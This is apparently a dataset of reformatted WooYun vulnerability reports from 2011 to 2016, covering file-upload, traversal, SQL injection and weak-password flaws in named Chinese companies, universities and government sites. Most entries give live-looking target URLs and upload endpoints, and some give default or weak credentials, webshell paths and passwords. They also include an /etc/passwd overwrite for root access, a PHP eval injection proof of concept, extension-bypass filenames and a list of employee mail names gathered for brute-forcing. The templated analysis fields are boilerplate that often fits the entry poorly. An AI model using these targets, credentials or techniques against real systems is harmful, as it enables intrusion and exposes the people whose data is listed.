**绕过**: 直接利用

**修复**: //
---

---
### [wooyun-2015-0119217] 汇金通银存在任意文件上传漏洞可导致任意代码执行（截断突破）
**厂商**: 93yin.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址 http://www.93yin.com/index.php?r=default/photo/zpbc&id=27截断上传由于不解析php并且是linux，所以换一下大小写就行了

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 你们更专业
---

---
### [wooyun-2014-057325] 南方医科大学校务处数据库泄漏
**厂商**: 南方医科大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先后台上下：http://jxgl.fimmu.com/admin/Admin_Login.asphttp://jxgl.fimmu.com/Database/SiteWeaver.mdb动易CMS的扫了下发现很多数据库地址下载试试看还有很多文件就不多说了另外还存在http://jxgl.fimmu.com/jwc/user/Upload.asp?dialogtype=UserBlogPic&size=5文件上传注册会员之后登陆，文件上传这个你们应该比我懂

**POC**: 看详细说明

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2015-0121567] 中兴ZXSEC/US统一安全网关任意文件上传提权
**厂商**: 中兴通讯股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 案例：https://58.42.250.234/https://www.lngmxx.com/https://60.13.3.21/https://120.195.49.238/https://124.163.249.126/这里以www.lngmxx.com为例默认账户密码都是admin登陆进来之后，在系统——配置文件——Flash空间管理 上传文件如图：抓包，修改filename为../../../etc/passwd可覆盖/etc/passwd这个文件通过之前的任意文件下载漏洞，我们可以获取到系统本身的/etc/passwd文件，下载下来，然后将admin那一行改成admin:x:0:0::/home/admin:/bin/bash这样，我们通过admin登陆ssh，就变成了root权限了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤文件名
---

---
### [wooyun-2015-0135035] 某市住房保障局OA上传漏洞
**厂商**: 某市住房备案系统 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCK控制不严格导致上传**.**.**.**:8888/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx已经有人上传了木马比较多，要尽快检查

**POC**: 还有**.**.**.**:8888/ 这个OA管理员是个弱口令

**绕过**: 直接利用

**修复**: 快点改。。。。你这关乎全市人民的信息安全！！！
---

---
### [wooyun-2011-01407] 58同城网上传漏洞
**厂商**: 58同城 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 58同城网允许任意用户注册,注册后登陆个人中心在修改资料上传头像处存在上传未过滤后缀问题,包含Gif89a头的文件格式均可上传!

**POC**: http://pic.58.com/m1/bigimage/n_9266907643652.asp

**绕过**: 直接利用

**修复**: 过滤脚本文件即可 .asp .php .asa. cer .aspx
---

---
### [wooyun-2014-085267] 音悦台某页面配置不当导致任意文件上传/列目录/下载
**厂商**: 音悦台 | **年份**: 2014 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.yinyuetai.com/fckeditor/editor/filemanager/connectors/test.htmlfck的test页面未删除 已成灾荒嘿嘿

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删掉就好了
---

---
### [wooyun-2015-0108215] xpshop网店系统任意文件上传漏洞
**厂商**: xpshop | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官方：http://www.xpshop.cn官方demo站：http://enframe.xpshop.cn/用户中心，添加场景。直接上传任意格式文件,上传一句话

**POC**: RS

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2016-0171825] 富士康某系统任意文件上传影响大量信息安全
**厂商**: 富士康科技集团 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ecshub.foxconn.com/System/RegistUser/RegistUserEdit.aspx?billno=USG201510300001

**POC**: http://ecshub.foxconn.com/1.aspx密码admin好多服务器密码和接口地址。

**绕过**: 直接利用

**修复**: 不懂。
---

---
### [wooyun-2015-0159040] 和睦家医疗某分站漏洞打包（文件上传&目录遍历&配置泄漏）
**厂商**: ufh.com.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://learning.ufh.com.cnhttp://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../../

**POC**: 配置信息泄漏http://learning.ufh.com.cn/CVS/Entrieshttp://learning.ufh.com.cn/adm/CVS/Entries文件上传http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorPOST http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp

**绕过**: 直接利用

**修复**: 正确配置fck
---

---
### [wooyun-2014-054630] 四川省某科技厅网站未授权访问
**厂商**: 四川省某科技厅 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 麻烦给个邀请码！   我都投了好几次了 拜托了大哥！漏洞链接http://www1.scst.gov.cn:90/Tech_Contract/BackDoor/SpecialColumn.aspxhttp://www1.scst.gov.cn:90/Tech_Contract/BackDoor/VideoCtl.aspxhttp://www1.scst.gov.cn:90/Tech_Contract/BackDoor/pg_left.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0182041] 美的某站任意文件上传
**厂商**: midea.com | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://202.104.30.185/fckeditor/editor/fckeditor.html直接上传一个jsp格式的木马菜刀马 http://202.104.30.185//UserFiles/Image/yjh.jsp 密码 xiaomaroot权限

**POC**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://202.104.30.185/fckeditor/editor/fckeditor.html直接上传一个jsp格式的木马菜刀马 http://202.104.30.185//UserFiles/Image/yjh.jsp 密码 xiaomaroot权限

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0113342] 建文工程项目管理系统任意上传
**厂商**: 上海建文软件有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通用性漏洞,随便在百度上搜了几个http://cm.justwin.cn/http://www.xcrzkj.com/http://www.bbczcvnt.com/http://www.bociamc.com.cn/http://www.dmjtzs.com/http://114.242.206.5/http://113.31.17.184/由于使用了fckeditor编辑器，导致上传没有任何过滤，可以上传任意文件，拿其中一个站演示如下：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级下吧
---

---
### [wooyun-2015-0159988] 国联证券某站存在大量弱口令（涉及邮箱/职位/电话/内部文件等）
**厂商**: 国联证券 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这么多弱口令 也花了挺多时间  求上个首页  T_T问题出在你们的oa系统漏洞地址：http://newoa.glsc.com.cn:8082/但是审核大大您看清楚了我提交的这个跟WooYun: 国联证券某安全隐患导致可登陆多个系统（员工手机邮箱/内部文档/可找回密码/任意文件上传）不是同一个漏洞 他提交的弱口令是 123456而我找到了他们其他的弱口令我先用密码 a123456爆出一个用户，然后利用该用户导出他们的通讯录以下是通讯录+top500，后面爆破要用(可能有重复，这些都是邮箱名)：jiangzqchenklzhuqhengyqcaoxtyiqxuzbwujjwangwzhoucmwushengxuwzhangjfwanggjzhangfanzhaowywangtsmohyzhangyitangyunzhangliangrenphuanghaofengkjhouhbchenjji

**POC**: 证明：

**绕过**: 直接利用

**修复**: 1、希望你们能大整改 杜绝弱口令2、登录处加验证码 提高安全性
---

---
### [wooyun-2015-0104983] 中国铁建多站漏洞集合#SQL注射+文件上传
**厂商**: 中国铁建 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：http://www.cr23g.com/jtdt_dc.asp?id=82922，上传地址：http://www.cr12ja.com/htmledit/popup.asp

**POC**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：http://www.cr23g.com/jtdt_dc.asp?id=82922，上传地址：http://www.cr12ja.com/htmledit/popup.asp

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2014-055706] 某省安全生产科学技术研究中心问题打包（注+任+敏+fck+弱明+配错）
**厂商**: 某省安全生产科学技术研究中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ..........

**POC**: Target: 		http://www.jxakzx.com/notices.jsp?keyno=14Host IP:		103.28.204.112Web Server: 	Apache/2.2.2 (Win32) mod_jk/1.2.18DB Server: 	MySQL >=5Resp. Time(avg):	606 msCurrent User: 	jxak@localhostSql Version: 	5.5.19Current DB: 	jxakSystem User: 	jxak@localhostHost Name: 	bbdx-5961d93ea4Installation

**绕过**: 直接利用

**修复**: .....................
---

---
### [wooyun-2012-015124] 初刻Crucco主站任意代码执行
**厂商**: 初刻Crucco | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.crucco.com/huodongye.php?pn=zucefangsi在这里我们发现pn的值没有指定，可以任意提交，我们推断应该程序员写成以下代码$smarty->display($_GET['p']);我们找到ecshop中的 display方法 发现里面用了evalfunction _eval($content){ob_start();eval('?' . '>' . trim($content));$content = ob_get_contents();ob_end_clean();return $content;}

**POC**: 我们提交以下url:http://www.crucco.com/huodongye.php?pn=str:%3C?php%20phpinfo%28%29;//会发现可爱的phpinfo出来了

**绕过**: 直接利用

**修复**: 指定pn的值
---

---
### [wooyun-2016-0190080] 华英证券OA任意文件上传漏洞
**厂商**: 华英证券 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址：http://**.**.**.**:7001/defaultroot/work_flow/formOptJSPUpload.jsp传个test试试。http://**.**.**.**:7001/defaultroot/work_flow/test.jsp发现可以。再传个马试试。http://**.**.**.**:7001/defaultroot/work_flow/test2.jsp发现一样可以。

**POC**: 发个图证明下。求个码，谢谢。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0112280] 北京娜迦主站任意文件上传
**厂商**: 北京娜迦信息科技 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在主站登录进去，上传图片处：截断，然后重放：注意参数imagePathFormat这儿可以直接控制上传目录，但是当我改成文件的时候，直接就会生成文件哦。我们访问：http://www.nagain.com/media/index.html

**POC**: 哦耶，中招。

**绕过**: 截断攻击

**修复**: 过滤下咯~
---

---
### [wooyun-2015-0132677] 中国旺旺集团存在FCK漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 小漏洞也是懂，希望通过！http://**.**.**.**/FCKeditor/editor/filemanager/connectors/test.htmlhttp://**.**.**.**/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=../../connectors/aspx/connector.aspx

**POC**: 小漏洞也是懂，希望通过！FCK就不用证明了。。。大家都知道

**绕过**: 直接利用

**修复**: 小漏洞也是懂，希望通过！
---

---
### [wooyun-2012-06863] 国内优秀的JAVA(JSP)内容网站管理系统.FCK上传漏洞
**厂商**: jeecms | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址:www.域名/thirdparty/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp

**POC**: 使用JEECMS系统的网站FCK漏洞地址：1、中国物流信息中心：http://www.clic.org.cn/http://www.clic.org.cn/thirdparty/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp2、黑龙江发展改革委员会： http://www.hljdpc.gov.cn/http://www.hljdpc.gov.cn/thirdparty/fckeditor/editor/filemanager/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06736] 国家外交部某分站可上传任意文件
**厂商**: 国家外交部 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://youth.mfa.gov.cn/twnew/twnew_w/cfly/edit/upload.aspx?n=1110137649 这里的上传可以任意上传脚本后缀

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-038036] 南开大学某分站第三方cms导致iis上传解析漏洞
**厂商**: nankai.edu.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用的是SiteServer V3.4.5 版本，前台注册上传，官方的补丁都出好久了。

**POC**: null

**绕过**: 直接利用

**修复**: 下载最新补丁、
---

---
### [wooyun-2015-0104660] 某大型上市电信公司前台若口令导致直接上传马
**厂商**: 浙江八方电信有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 公司主站有员工的办公系统，url：http://www.8telecom.cn/OA/login.php 。没有验证码，根据搜到的网站邮箱用户名，进行暴力破解，如 tangxianpeng 密码888888  。进入后，发表文章时，附件出可以直接上传php文件。不过服务器的权限设置的挺好， 本人也没有继续下去，水平有限。

**POC**: 前台登陆地址：进入系统后，可以看到一些红头文件

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2015-0133589] 改图网主站服务器沦陷
**厂商**: gaitu.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不玩了 下午把你的网站差点玩坏了 经常404我就来提交了先来注册个帐号这里是上传地址：http://www.yifutu.com/zbfzzdyxuqiu.html?fdsTid=35714上传是jpg用burp改成aspx第二个包略过到第三个包再一次提交 马的地址就出来了然后菜刀连上服务器里面有100多站主站点到即止

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025078] 中国商务部某子站目录信息泄露导致可渗透
**厂商**: 中国商务部 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传页面，上传任意文件！！http://wszw.hzs.mofcom.gov.cn/fecp/portalpubsys/jbhtmledit/dlg_insert_media.jsp漏洞页面

**POC**: -  - 小菜技术不够，不然搞到数据库应该会更好玩~有个OA~~

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2012-014598] 红孩子某站任意上传
**厂商**: 北京红孩子互联科技有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: google发现大量上传页面  而且都没有经过严格的过滤。

**POC**: 这里只需用合成图片一句话便可突破成功拿到shell权限很大，试着提权但是没成功 估计是360拦截了吧。

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2015-0136394] 哈工大某分站配置不当泄露信息
**厂商**: 哈尔滨工业大学 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ee403.hit.edu.cn/database.rar某天找漏洞，本来想找个文件上传漏洞。居然看到直接有个database.rar,可能是某次备份忘了设置权限吧，直接放在根目录了。下载了放在SQL Server里面打开。admin表：还有500多哈工大的注册用户

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 数据库这么重要的东西，还是别乱放吧。
---

---
### [wooyun-2013-032619] GISOFT.GCMS通杀上传漏洞
**厂商**: 南宁熙软科技 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传提示绕过后。修改文件名xx.asp;.jpg成功上传。如果遇到IIS6 解析漏洞  可以直接访问。如果没有IIS6漏洞 可以修改文件名

**POC**: 修改文件名xx.asp;.jpg成功上传。如果遇到IIS6 解析漏洞  可以直接访问。如果没有IIS6漏洞 可以修改文件名

**绕过**: 过滤绕过

**修复**: ——。——添加限制、
---

---
### [wooyun-2012-05563] 中国移动mas2.0平台系统漏洞
**厂商**: 中国移动 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、产品说明MAS是中国移动的短信代理网关（平台）。MAS是Mobile Agent Server的简称。目前多个政府部门、国有大型企业部门、运营商、金融部门都采用该平台。MAS2.0是中国新一代的代理网关系统。二、漏洞细节1、后台验证绕过漏洞后台管理页面对session赋值存在逻辑错误，使得攻击者在登陆页面输入错误账户后可以得到一个返回true的session值，此时可以直接访问后台页面，可以获取敏感资料和发送短信（厅级领导个人电话，或者发送欺骗短信）。测试步骤：a、访问登陆页面http://x.x.x.x/logon.jsp输入任意账户，登陆。b、直接访问http://x.x.x.x/left.jsp2、文件上传部门mas平台存在通信录和彩信图片上传界面，可以通过截断和本地提交方式上传jsp文件。（不通用，仅测试了一个，部分mas2.0不存在上传页面）。三、修复建议1、对后台文件进行权

**POC**: (见原文)

**绕过**: 过滤绕过, 截断攻击

**修复**: 1、对后台文件进行权限验证；2、过滤上传文件后缀；
---

---
### [wooyun-2013-019912] 广东省肇庆市国土资源局网站任意文件上传漏洞
**厂商**: 广东肇庆市国土局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.zqgtzy.gov.cn/cmshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/fjsc.jsp?filePath=cms-uploadfiles-download&isfn=1&ischeck=1&fileType=.jpg,.bmp,.gif,.rar,.zip,.doc,.jsp,.wps

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 唔知哦
---

---
### [wooyun-2012-013029] [漏网之鱼]海关总署,我又来了``
**厂商**: 中华人民共和国海关总署 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 基于上次发的已经很详细了 这次就简要描述下:http://www1.customs.gov.cn/tabid/47316/ctl/Edit/mid/118574/InfoID/378661/Default.aspx权限限制不严啊``上传asp;.jpg之类的``然后就OK了提权 渗透``不是什么难事``我懒 嘻嘻C段都是海关的信息系统啊``

**POC**: 数据库什么的`

**绕过**: 直接利用

**修复**: 海关总署,包括主站都是采用easysite系统,稍微看了下 后台管理系统认证疏松 导致未经认证的任意用户可以达到操作后台的目的`几乎每一个站都有这漏洞 主站也有`只是有些站点的服务器貌似做了解析漏洞的策略,所以有些站拿不下shell,但还是可以修改网站的信息的`建议服务器都升级吧``IIS7.5,还
---

---
### [wooyun-2014-068108] 用友某通用学习管理系统设计不当致用户信息泄漏(可批量)
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某通用型在线学习管理系统存在任意文件上传及任意文件下载漏洞,WooYun: 某通用型在线学习管理系统存在任意文件上传漏洞（另一种奇葩姿势）用友的e-Learning，wefgod大牛提交过，这里摘取一下他之前提供的弱口令：首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://58.214.233.113:8800/lmsv5/00041013/12345600041014/123456http://60.216.4.162:9091/lmsv5/107648/111111107640/111111

**POC**: http://58.214.233.113:8800/lmsv5/ 为例，通过在我的信息-修改信息的时候，发现了这么一个GET请求:Request URL:http://58.214.233.113:8800/lmsv5/user!editUserInfo.action?IA_USERID=38766Request Method:GETStatus Code:200 OK修改此处的A_USERID可以实现遍历他人信息，包括（用户名，邮件地址，手机号码，固定电话，证件号码，地址，昵称）仅此站点，通过简单的测试，从IA_USERID1-38766用户中统计出了18911有填写用户信息的用户，在提交

**绕过**: 直接利用

**修复**: 你们懂，仅求高rank.
---

---
### [wooyun-2015-0109739] 广东财经大学存在上传漏洞
**厂商**: 广东财经大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jwxt.gdufe.edu.cn/(S(tvucbvssw1ku22lnfruatehm))/default2.aspxhttp://jwxt.gdufe.edu.cn/(S(tvucbvssw1ku22lnfruatehm))//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspx地址 fck2.6.6

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 邀请码
---

---
### [wooyun-2012-06517] 江民病毒上报分站真能上传（病毒）
**厂商**: 北京江民新科技术有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江民病毒上报分站上传处过滤不严，服务器配置不当，造成可以上传asp木马。分站：http://virusup.jiangmin.com/没有对上传路径进行过滤，IIS6解释漏洞。具体看图吧。http://virusup.jiangmin.com/uploadfile/virusup/diy.asp/20120428221403412.zip（ps:只上传了，也没做什么，也不知那服务器重不重要，马还没删除，你们处理下吧!）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 目录过滤，上传目录禁止执行！您们应该更懂！
---

---
### [wooyun-2012-016093] 利用上传成功进入腾讯某站
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在上传页面上传文件之后可以通过抓包修改上传文件名称来绕过验证,从而导致可上传动态脚本。PS：碰到真是运气....不知道企鹅多少漏洞之后送娃娃http://fenxiang.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/index.phphttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/apply 漏洞页面http://fenxiang.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploads/1355631395_yijuhua.php 一句话

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的...
---

---
### [wooyun-2014-054606] 某省交通数据录入与维护系统目录遍历编辑器漏洞（已有黑客放置后门）
**厂商**: nmjt.gov.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/http://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/UserFiles/Image/test/no.jsphttp://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/baseControl/js/editor/FCKeditor/editor//filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connectorhttp://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/baseControl/截图说明。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 补~~~
---

---
### [wooyun-2012-013808] ThinkSNS又一个任意上传文件漏洞
**厂商**: ThinkSNS | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前看到有人找到一个任意上传的漏洞。所以看了一下。不知道是否和他的一致地址WooYun: ThinkSNS 2.8 上传任意文件漏洞代码产生位置apps\wap\Lib\Action\IndexAction.class.php263行if(!empty($_FILES['pic']['name'])) { // 自动发一条图片微博$data['pic']      = $_FILES['pic'];$data['content']  = '图片分享';$data['from']     = $this->_type_wap;$res = api('Statuses')->data($data)->upload();}未对文件类型过滤

**POC**: 访问wap 模块发一条微博并传图firebug 地址去掉small_然后访问http://================/data/uploads/2012/1023/17/50865d481c217.php

**绕过**: 直接利用

**修复**: 对上传类型要进行检查
---

